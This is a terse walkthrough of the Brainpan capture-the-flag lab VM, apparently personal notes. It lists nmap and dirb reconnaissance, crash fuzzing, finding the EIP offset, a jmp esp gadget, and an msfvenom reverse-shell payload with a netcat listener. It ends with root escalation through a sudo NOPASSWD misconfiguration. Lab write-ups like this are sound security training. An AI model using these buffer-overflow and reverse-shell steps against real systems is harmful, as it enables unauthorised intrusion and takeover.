Box runs a DHCP service
-> Config brainpan & and a kali box as Host-only or NAT and scan for the ip
nmap -sn 192.168.56.1/24

Check for open ports
nmap -sV 192.168.56.104
PORT      STATE SERVICE VERSION
9999/tcp  open  abyss?
10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)

[connect to HTTP Server]

Running dictionary attack on servers file tree (DIRB)
dirb  http://192.168.56.104:10000
discovers /bin dir and download file
wget -q http://192.168.56.104:10000/bin/brainpan.exe

[use radar2/winedbg to examine binary]

send huge amount of data to check if program crashes
#python3 -c "print('1'*9999)" | ncat 127.0.0.1 9999
##of course it does xD

De Brujin Pattern to determine at which offset EIP gets overwritten
#ragg2 -P 9999 -r | ncat 127.0.0.1 9999 
check value in register with 'ragg2 -q 0x43413243' to get offset

Find ROP gadget with r2
#/c jmp esp

Write addr of ROP gadget (little endian !) into EIP
#payload = offset*'A'+addr(ROP gadget)

[check for bad chars !]

Craft a payload with mfsvenom
#msfvenom -p windows/shell_reverse_tcp LHOST=eth0 LPORT=8080 EXITFUNC=thread \
#-f raw -b "\x00\x09\x0d\x0a\x20\xff" -n 32 > warhead.txt

Launch attack and don't forget to have a listener ready 
#nc -nlp 8888

Set up a reverse shell
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

check if finished
#sudo -i

check files with special permissions
#sudo -l
->  (root) NOPASSWD: /home/anansi/bin/anansi_util

get interactive tty
https://web.archive.org/web/20190423045328/http://netsec.ws/?p=337

Launch /home/anansi/bin/anansi_util manual yes
!bash to get root

